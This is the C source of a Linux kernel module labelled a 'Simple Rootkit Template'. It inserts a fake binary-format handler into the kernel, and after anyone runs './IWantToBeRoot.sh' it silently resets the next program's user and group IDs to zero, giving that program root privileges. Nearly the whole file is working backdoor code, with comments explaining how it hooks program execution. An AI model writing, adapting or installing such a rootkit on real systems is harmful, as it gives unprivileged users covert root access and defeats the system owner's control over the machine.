#include <linux/module.h>
#include <linux/init.h>
#include <linux/binfmts.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/cred.h>

struct linux_binfmt* fake_binfmt;
bool give_root;

//
//Our fake binary format will be inserted at the top of the 'formats' list in the Linux Kernel. This is scanned every time that a binary has to be exeuted
//Every format will define a function which will handle the executable to run, if it is of the same format
//If it is not, the function will return -ENOEXEC and the scanning will continue
//
//In our case, the handler function is fake_load_binary; in here we can define the actual rootkit code, which will be executed every time that a program is run
//
//In this case, when the user execute the command './IWantToBeRoot.sh', the next executed program will be runned as root;
//
//We return this error code otherwise the loader would think that this is the right handler for every executable format (since it is at the beginning of the list)
//
int fake_load_binary (struct linux_binprm* binprm)
{
  if (give_root)
  {
    binprm->cred->uid.val = binprm->cred->gid.val = 0;
    binprm->cred->suid.val = binprm->cred->sgid.val = 0;
    binprm->cred->euid.val = binprm->cred->egid.val = 0;
    binprm->cred->fsuid.val = binprm->cred->fsgid.val = 0;
    give_root = 0;
  }

  if (strcmp("./IWantToBeRoot.sh", binprm->filename) == 0)
  {
    give_root = 1;
  }

  //
  //size_t filename_len = strlen(binprm->filename);
  //char* executable_file = kmalloc (sizeof (char) * filename_len, GFP_KERNEL);
  //strcpy (executable_file, binprm->filename);
  //printk (executable_file);
  //kfree(executable_file);
  //

  return -ENOEXEC;
}

static int __init add_fake_binfmt (void)
{
  fake_binfmt = kmalloc (sizeof (struct linux_binfmt), GFP_KERNEL);
  give_root = 0;

  if (likely(fake_binfmt))
  {
    fake_binfmt->load_binary = fake_load_binary;
    insert_binfmt (fake_binfmt);
  }

  return 0;
}

static void __exit delete_fake_binfmt (void)
{
  unregister_binfmt (fake_binfmt);
  kfree (fake_binfmt);
}


module_init(add_fake_binfmt);
module_exit(delete_fake_binfmt);

MODULE_LICENSE ("GPL");
MODULE_AUTHOR ("Gaetano Paolo Sapia");
MODULE_DESCRIPTION ("Simple Rootkit Template");
